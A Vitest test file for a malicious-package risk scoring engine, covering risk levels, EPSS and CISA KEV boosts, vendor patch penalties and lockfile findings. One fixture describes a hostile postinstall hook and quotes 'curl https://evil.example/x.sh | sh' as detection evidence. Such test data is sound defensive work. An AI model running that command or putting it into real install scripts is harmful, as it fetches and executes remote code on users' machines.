import { describe, expect, it } from "vitest";

import { emptyBehaviorSummary, emptyScriptThreatSummary, sampleAnalyses } from "@binshield/analysis-types";
import type { ManifestAnalysis } from "@binshield/analysis-types";
import {
  aggregatePackageRisk,
  aggregatePackageRiskWithManifest,
  buildCisaKevFindings,
  buildLockfilePatchableFindings,
  cisaKevBoost,
  epssBoost,
  patchDeploymentModifier,
  riskLevelFromScore,
  scoreBinary,
  scoreManifest,
  vendorPatchPenalty
} from "./index";
import type {
  CisaKevContext,
  EpssContext,
  LockfileResolutionContext,
  PatchDeploymentContext,
  VendorPatchContext
} from "./index";

function makeManifest(overrides: Partial<ManifestAnalysis> = {}): ManifestAnalysis {
  return {
    id: "manifest_test",
    ecosystem: "npm",
    lifecycleHooks: {},
    hasInstallScripts: false,
    analyzedFiles: [],
    riskScore: 0,
    riskLevel: "none",
    threats: emptyScriptThreatSummary(),
    findings: [],
    knownMalwareAdvisoryIds: [],
    sourceMatchConfidence: "medium",
    analyzedAt: "2026-05-21T00:00:00.000Z",
    ...overrides
  };
}

describe("risk engine", () => {
  it("maps scores to levels", () => {
    expect(riskLevelFromScore(0)).toBe("none");
    expect(riskLevelFromScore(12)).toBe("low");
    expect(riskLevelFromScore(34)).toBe("medium");
    expect(riskLevelFromScore(65)).toBe("high");
    expect(riskLevelFromScore(91)).toBe("critical");
  });

  it("scores suspicious behaviors above benign ones", () => {
    const low = scoreBinary({
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 4,
      functionCount: 20
    });
    const high = scoreBinary({
      behaviors: {
        ...emptyBehaviorSummary(),
        network: { detected: true, details: ["Connects to remote host"] },
        dataExfiltration: { detected: true, details: ["Uploads environment variables"] },
        obfuscation: { detected: true, details: ["Encrypted strings"] }
      },
      findings: [
        {
          severity: "critical",
          title: "Outbound exfiltration",
          description: "Sends data to an unknown domain",
          recommendation: "Block package"
        }
      ],
      importCount: 18,
      functionCount: 52
    });

    expect(high.riskScore).toBeGreaterThan(low.riskScore);
    expect(high.riskLevel).toBe("critical");
  });

  it("aggregates package risk from binaries", () => {
    const aggregate = aggregatePackageRisk(sampleAnalyses[0].binaries);
    expect(aggregate.riskScore).toBeGreaterThan(0);
    expect(aggregate.riskLevel).toBe("low");
  });

  it("scores a malicious install script even when the package has no binaries", () => {
    const manifest = makeManifest({
      hasInstallScripts: true,
      threats: {
        ...emptyScriptThreatSummary(),
        remoteCodeExecution: { detected: true, details: ["postinstall pipes curl into a shell"] },
        environmentTheft: { detected: true, details: ["reads process.env.NPM_TOKEN"] }
      },
      findings: [
        {
          category: "remoteCodeExecution",
          severity: "critical",
          title: "Remote code execution in postinstall hook",
          description: "postinstall hook downloads and executes remote code at install time",
          filePath: "package.json#scripts.postinstall",
          evidence: "curl https://evil.example/x.sh | sh",
          lifecycleHook: "postinstall",
          recommendation: "Do not install this package."
        }
      ]
    });

    const score = scoreManifest(manifest);
    expect(score.riskScore).toBeGreaterThan(0);
    expect(score.riskLevel).toBe("critical");

    // The old binary-only path returns "none" for a package with no binaries —
    // this is the gap the manifest path closes.
    expect(aggregatePackageRisk([]).riskLevel).toBe("none");
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("forces a critical verdict for known-malware matches", () => {
    const manifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(manifest)).toEqual({ riskScore: 100, riskLevel: "critical" });
    expect(aggregatePackageRiskWithManifest([], manifest).riskLevel).toBe("critical");
  });

  it("takes the max of binary and manifest risk, never diluting either", () => {
    const cleanManifest = makeManifest();
    const binaryOnly = aggregatePackageRisk(sampleAnalyses[0].binaries);
    const merged = aggregatePackageRiskWithManifest(sampleAnalyses[0].binaries, cleanManifest);
    expect(merged.riskScore).toBe(binaryOnly.riskScore);
  });
});

describe("EPSS boost", () => {
  it("returns 0 when no EPSS context is provided", () => {
    expect(epssBoost(undefined)).toBe(0);
  });

  it("returns 0 when percentile is below 0.75", () => {
    expect(epssBoost({ maxEpssPercentile: 0.50 })).toBe(0);
    expect(epssBoost({ maxEpssPercentile: 0.74 })).toBe(0);
  });

  it("returns 15 when percentile is between 0.75 and 0.90", () => {
    expect(epssBoost({ maxEpssPercentile: 0.75 + 0.001 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.80 })).toBe(15);
    expect(epssBoost({ maxEpssPercentile: 0.90 })).toBe(15);
  });

  it("returns 25 when percentile exceeds 0.90 (exploited in the wild)", () => {
    expect(epssBoost({ maxEpssPercentile: 0.901 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 0.99 })).toBe(25);
    expect(epssBoost({ maxEpssPercentile: 1.0 })).toBe(25);
  });

  it("scoreBinary applies EPSS boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    const withLowEpss = scoreBinary(binary, { maxEpssPercentile: 0.50 });
    const withHighEpss = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreBinary(binary, { maxEpssPercentile: 0.95 });

    // No boost below threshold
    expect(withLowEpss.riskScore).toBe(withoutEpss.riskScore);
    // 15-pt boost above 0.75
    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    // 25-pt boost above 0.90
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));
  });

  it("scoreBinary with EPSS boost escalates risk level for borderline packages", () => {
    // A low-risk binary (score ~8) should escalate to medium when an EPSS
    // percentile > 0.75 is present (+15 → 23 = medium)
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "low" as const, title: "Minor issue", description: "Minor", recommendation: "Review" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutEpss = scoreBinary(binary);
    expect(withoutEpss.riskLevel).toBe("low");

    const withEpss = scoreBinary(binary, { maxEpssPercentile: 0.85 });
    // 8 + 15 = 23 → still low boundary, depending on base; assert it is higher
    expect(withEpss.riskScore).toBeGreaterThan(withoutEpss.riskScore);
  });

  it("scoreManifest applies EPSS boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();

    const withoutEpss = scoreManifest(cleanManifest);
    const withHighEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.80 });
    const withCriticalEpss = scoreManifest(cleanManifest, { maxEpssPercentile: 0.95 });

    expect(withHighEpss.riskScore).toBe(withoutEpss.riskScore + 15);
    expect(withCriticalEpss.riskScore).toBe(Math.min(100, withoutEpss.riskScore + 25));

    // Known-malware still forces 100 even with EPSS context
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, { maxEpssPercentile: 0.95 })).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// CISA KEV boost
// ---------------------------------------------------------------------------

function makeKev(overrides: Partial<CisaKevContext> = {}): CisaKevContext {
  return {
    kevMatches: [],
    ...overrides
  };
}

describe("CISA KEV boost", () => {
  it("returns 0 when no KEV context provided", () => {
    expect(cisaKevBoost(undefined)).toBe(0);
  });

  it("returns 0 for empty matches array", () => {
    expect(cisaKevBoost(makeKev())).toBe(0);
  });

  it("returns 0 for proof-of-concept only (no confirmed exploitation)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-15", exploitMaturity: "proof-of-concept" }]
        })
      )
    ).toBe(0);
  });

  it("returns +20 for active-exploitation match", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 for widespread match (ransomware-level)", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
        })
      )
    ).toBe(20);
  });

  it("returns +20 when mix of proof-of-concept and active-exploitation", () => {
    expect(
      cisaKevBoost(
        makeKev({
          kevMatches: [
            { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
            { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }
          ]
        })
      )
    ).toBe(20);
  });

  it("scoreBinary applies CISA KEV boost on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noKev = scoreBinary(binary);
    const withPoC = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
    }));
    const withActive = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    // PoC does not boost
    expect(withPoC.riskScore).toBe(noKev.riskScore);
    // Active exploitation adds +20
    expect(withActive.riskScore).toBe(noKev.riskScore + 20);
  });

  it("scoreBinary stacks EPSS and CISA KEV boosts independently", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    const noBoosts = scoreBinary(binary);
    const epssOnly = scoreBinary(binary, { maxEpssPercentile: 0.80 });
    const kevOnly = scoreBinary(binary, undefined, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));
    const both = scoreBinary(binary, { maxEpssPercentile: 0.80 }, makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    }));

    expect(epssOnly.riskScore).toBe(noBoosts.riskScore + 15);
    expect(kevOnly.riskScore).toBe(noBoosts.riskScore + 20);
    expect(both.riskScore).toBe(Math.min(100, noBoosts.riskScore + 15 + 20));
  });

  it("scoreManifest applies CISA KEV boost while preserving malware-override", () => {
    const cleanManifest = makeManifest();
    const kev = makeKev({
      kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" }]
    });

    const withoutKev = scoreManifest(cleanManifest);
    const withKev = scoreManifest(cleanManifest, undefined, kev);

    expect(withKev.riskScore).toBe(withoutKev.riskScore + 20);

    // Known-malware still forces 100 regardless of KEV
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, undefined, kev)).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });
});

// ---------------------------------------------------------------------------
// buildCisaKevFindings
// ---------------------------------------------------------------------------

describe("buildCisaKevFindings", () => {
  it("returns empty array when no KEV context", () => {
    expect(buildCisaKevFindings(undefined)).toEqual([]);
  });

  it("returns empty array when no matches", () => {
    expect(buildCisaKevFindings(makeKev())).toEqual([]);
  });

  it("does not emit findings for proof-of-concept only", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" }]
      })
    );
    expect(findings).toHaveLength(0);
  });

  it("emits CRITICAL finding for active-exploitation", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0002", firstSeenDate: "2024-03-10", exploitMaturity: "active-exploitation" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-Actively-Exploited-In-Wild");
    expect(findings[0]!.title).toContain("CVE-2024-0002");
    expect(findings[0]!.description).toContain("active-exploitation");
    expect(findings[0]!.description).toContain("2024-03-10");
  });

  it("emits CRITICAL finding for widespread (ransomware)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [{ cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }]
      })
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("critical");
    expect(findings[0]!.title).toContain("CVE-2024-0003");
  });

  it("emits one finding per active CVE (multiple matches)", () => {
    const findings = buildCisaKevFindings(
      makeKev({
        kevMatches: [
          { cveId: "CVE-2024-0001", firstSeenDate: "2024-01-01", exploitMaturity: "proof-of-concept" },
          { cveId: "CVE-2024-0002", firstSeenDate: "2024-03-01", exploitMaturity: "active-exploitation" },
          { cveId: "CVE-2024-0003", firstSeenDate: "2024-06-01", exploitMaturity: "widespread" }
        ]
      })
    );
    // PoC is excluded; active + widespread = 2 findings
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.severity === "critical")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Vendor patch penalty
// ---------------------------------------------------------------------------

function makePatch(overrides: Partial<VendorPatchContext> = {}): VendorPatchContext {
  return {
    cveId: "CVE-2024-9999",
    patchedVersion: "2.0.0",
    daysToFix: 30,
    vendorConfidence: "high",
    ...overrides
  };
}

describe("vendorPatchPenalty", () => {
  it("returns 0 when no patches are provided", () => {
    expect(vendorPatchPenalty(undefined)).toBe(0);
    expect(vendorPatchPenalty([])).toBe(0);
  });

  it("returns -15 for high-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "high" })])).toBe(-15);
  });

  it("returns -10 for medium-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "medium" })])).toBe(-10);
  });

  it("returns -5 for low-confidence patch", () => {
    expect(vendorPatchPenalty([makePatch({ vendorConfidence: "low" })])).toBe(-5);
  });

  it("uses best-confidence patch when multiple patches are provided", () => {
    const patches = [
      makePatch({ vendorConfidence: "low" }),
      makePatch({ vendorConfidence: "high" }),
      makePatch({ vendorConfidence: "medium" })
    ];
    expect(vendorPatchPenalty(patches)).toBe(-15);
  });

  it("scoreBinary applies vendor patch penalty on top of base score", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "high" as const, title: "Vuln", description: "desc", recommendation: "fix" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutPatch = scoreBinary(binary);
    const withHighPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    const withMedPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "medium" })]);

    // Patch reduces score by 15 / 10 / 5 respectively
    expect(withHighPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 15));
    expect(withMedPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 10));
  });

  it("scoreManifest applies vendor patch penalty while preserving malware-override", () => {
    const manifest = makeManifest({
      threats: {
        ...emptyScriptThreatSummary(),
        scriptInjection: { detected: true, details: ["eval usage"] }
      },
      findings: [
        {
          category: "scriptInjection",
          severity: "high",
          title: "Script injection",
          description: "eval usage",
          filePath: "index.js",
          evidence: "eval(x)",
          recommendation: "Remove eval"
        }
      ]
    });

    const withoutPatch = scoreManifest(manifest);
    const withPatch = scoreManifest(manifest, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);

    expect(withPatch.riskScore).toBe(Math.max(0, withoutPatch.riskScore - 15));

    // Known-malware still forces 100 even with a patch context
    const malwareManifest = makeManifest({ knownMalwareAdvisoryIds: ["MAL-2026-0001"] });
    expect(scoreManifest(malwareManifest, undefined, undefined, [makePatch({ vendorConfidence: "high" })])).toEqual({
      riskScore: 100,
      riskLevel: "critical"
    });
  });

  it("vendor patch penalty stacks with EPSS boost but cannot push score below 0", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [],
      importCount: 0,
      functionCount: 0
    };

    // Base score = 0; EPSS adds 15; patch subtracts 15 → still 0
    const result = scoreBinary(binary, { maxEpssPercentile: 0.80 }, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    expect(result.riskScore).toBe(0);
  });

  it("real-world scenario: CRITICAL CVE becomes MEDIUM after vendor patch (high confidence)", () => {
    // A binary with a critical finding scores ~45; -15 patch penalty → 30 (medium boundary)
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "critical" as const, title: "RCE", description: "Remote code execution", recommendation: "Upgrade" }],
      importCount: 0,
      functionCount: 0
    };

    const withoutPatch = scoreBinary(binary);
    expect(withoutPatch.riskLevel).toBe("medium"); // 45 → medium

    // After high-confidence patch: 45 - 15 = 30 → still medium boundary
    const withPatch = scoreBinary(binary, undefined, undefined, undefined, [makePatch({ vendorConfidence: "high" })]);
    expect(withPatch.riskScore).toBe(withoutPatch.riskScore - 15);
  });
});

// ---------------------------------------------------------------------------
// Patch deployment modifier
// ---------------------------------------------------------------------------

function makeDeployment(overrides: Partial<PatchDeploymentContext> = {}): PatchDeploymentContext {
  return {
    cveId: "CVE-2024-9999",
    patchPublishedAt: "2024-01-01T00:00:00.000Z",
    daysSincePatch: 30,
    ecosystemAdoptionRate: 0.3,
    ...overrides
  };
}

describe("patchDeploymentModifier", () => {
  it("returns 0 when no deployment context provided", () => {
    expect(patchDeploymentModifier(undefined)).toBe(0);
  });

  it("returns 0 when patch is too new (< 7 days)", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 3 }))).toBe(0);
  });

  it("returns 0 when adoption rate is below 5%", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: 0.04 }))).toBe(0);
  });

  it("returns 0 when adoption rate is unknown", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: undefined }))).toBe(0);
  });

  it("returns -5 when >= 30 days old and >= 25% adoption", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 30, ecosystemAdoptionRate: 0.25 }))).toBe(-5);
  });

  it("returns -10 when >= 90 days old and >= 50% adoption", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.50 }))).toBe(-10);
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 120, ecosystemAdoptionRate: 0.75 }))).toBe(-10);
  });

  it("returns -5 (not -10) when 90+ days but adoption < 50%", () => {
    expect(patchDeploymentModifier(makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.35 }))).toBe(-5);
  });

  it("stacks with vendorPatchPenalty for maximum downgrade", () => {
    const binary = {
      behaviors: emptyBehaviorSummary(),
      findings: [{ severity: "high" as const, title: "Vuln", description: "desc", recommendation: "fix" }],
      importCount: 0,
      functionCount: 0
    };

    const base = scoreBinary(binary);
    // High-confidence patch (-15) + mature deployment (-10) = -25
    const withBoth = scoreBinary(
      binary,
      undefined,
      undefined,
      undefined,
      [makePatch({ vendorConfidence: "high" })],
      makeDeployment({ daysSincePatch: 90, ecosystemAdoptionRate: 0.55 })
    );
    expect(withBoth.riskScore).toBe(Math.max(0, base.riskScore - 25));
  });
});

// ---------------------------------------------------------------------------
// buildLockfilePatchableFindings
// ---------------------------------------------------------------------------

function makeLockfileResolution(overrides: Partial<LockfileResolutionContext> = {}): LockfileResolutionContext {
  return {
    cveId: "CVE-2024-9999",
    resolvedVersion: "1.0.0",
    patchedVersion: "2.0.0",
    isUnpatched: true,
    ...overrides
  };
}

describe("buildLockfilePatchableFindings", () => {
  it("returns empty array when no resolutions provided", () => {
    expect(buildLockfilePatchableFindings(undefined)).toEqual([]);
    expect(buildLockfilePatchableFindings([])).toEqual([]);
  });

  it("returns empty array when all resolutions are patched", () => {
    const resolutions = [makeLockfileResolution({ isUnpatched: false })];
    expect(buildLockfilePatchableFindings(resolutions)).toHaveLength(0);
  });

  it("emits MEDIUM finding for unpatched lockfile entry", () => {
    const resolutions = [makeLockfileResolution({ isUnpatched: true })];
    const findings = buildLockfilePatchableFindings(resolutions);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.severity).toBe("medium");
    expect(findings[0]!.title).toContain("CVE-2024-9999");
    expect(findings[0]!.title).toContain("Patchable vulnerability");
    expect(findings[0]!.description).toContain("1.0.0");
    expect(findings[0]!.description).toContain("2.0.0");
  });

  it("emits one finding per unpatched CVE, skips patched ones", () => {
    const resolutions = [
      makeLockfileResolution({ cveId: "CVE-2024-0001", isUnpatched: true }),
      makeLockfileResolution({ cveId: "CVE-2024-0002", isUnpatched: false }),
      makeLockfileResolution({ cveId: "CVE-2024-0003", isUnpatched: true })
    ];
    const findings = buildLockfilePatchableFindings(resolutions);
    expect(findings).toHaveLength(2);
    expect(findings.every((f) => f.severity === "medium")).toBe(true);
    expect(findings.map((f) => f.title)).toContain("Patchable vulnerability: CVE-2024-0001");
    expect(findings.map((f) => f.title)).toContain("Patchable vulnerability: CVE-2024-0003");
  });

  it("finding description mentions both resolved and patched versions", () => {
    const findings = buildLockfilePatchableFindings([
      makeLockfileResolution({ resolvedVersion: "3.1.4", patchedVersion: "3.2.0", isUnpatched: true })
    ]);
    expect(findings[0]!.description).toContain("3.1.4");
    expect(findings[0]!.description).toContain("3.2.0");
    expect(findings[0]!.recommendation).toBeTruthy();
  });
});
